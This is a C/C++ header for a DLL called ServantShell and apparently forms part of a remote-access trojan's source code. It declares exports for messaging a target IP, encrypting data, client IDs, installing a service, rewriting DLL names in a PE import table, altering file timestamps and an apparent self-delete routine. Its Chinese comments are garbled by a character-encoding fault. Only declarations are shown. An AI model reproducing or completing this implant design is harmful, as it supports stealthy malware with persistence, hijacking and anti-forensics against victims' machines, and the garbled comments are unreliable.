#pragma once
#include "../../../common/CommNames.h"

#ifdef SERVANTSHELL_EXPORTS
#	define SHELL_API extern "C" 
#else
#	define SHELL_API extern "C" __declspec(dllimport)
#endif

//��ȡ��ǰ·��������ֵ��\��β
SHELL_API LPCTSTR GetLocalPath();

//�������������Ϣ
SHELL_API BOOL SendMsg(const LPBYTE pData, DWORD dwSize, COMM_NAME commname = COMMNAME_DEFAULT, ULONG targetIP = 0);

//���ӽ���
SHELL_API BOOL XFC(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1);

//��ȡ�ͻ���ID
SHELL_API BOOL GetClientID(GUID* pGuid);

//�˳�����
SHELL_API void Exit();

//�õ�������Ϣ
SHELL_API void GetSvrInfo(PSERVICE_INFO* const info);

//�ͻ����Ի�
SHELL_API void SD();

//�滻pe�ļ���IMAGE_IMPORT_DESCRIPTOR�е�dll�ļ���
SHELL_API BOOL ReplaceIIDName(LPVOID lpBase, LPCSTR pTargetName, LPCSTR pReplaceName);

//����ServantShell��ʱ����� �ļ�ʱ��
SHELL_API BOOL AdjustTimes(LPCTSTR filepath);

//��װ����
SHELL_API BOOL InitSvr();

//��������Ŀ¼��ʱ��
SHELL_API void CheckDT();

//��ʼ����ľ��
SHELL_API BOOL Init(BOOL bWait = TRUE);

//����������
SHELL_API void InitRun();